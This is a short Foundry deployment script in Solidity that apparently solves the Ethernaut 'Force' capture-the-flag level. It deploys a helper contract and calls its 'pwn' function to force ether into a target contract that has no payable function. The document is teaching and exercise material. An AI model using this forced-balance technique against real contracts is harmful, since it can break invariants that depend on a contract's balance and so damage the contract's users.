// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import {Force} from "../src/force/Force.sol";
import {ForcePayable} from "../src/force/ForcePayable.sol";

contract ForceScript is Script {
    Force force;

    function setUp() public {
        force = Force(0x9aaf40617343a9E43642D28D6eFE10807dcD082B);
    }

    function run() public {
        uint256 playerKey = vm.envUint("PRIVATE_KEY");

        assert(address(force).balance == 0);
        vm.startBroadcast(playerKey);

        ForcePayable forcePayable = new ForcePayable();
        forcePayable.pwn{value: 1}(force);

        assert(address(force).balance > 0);
    }
}
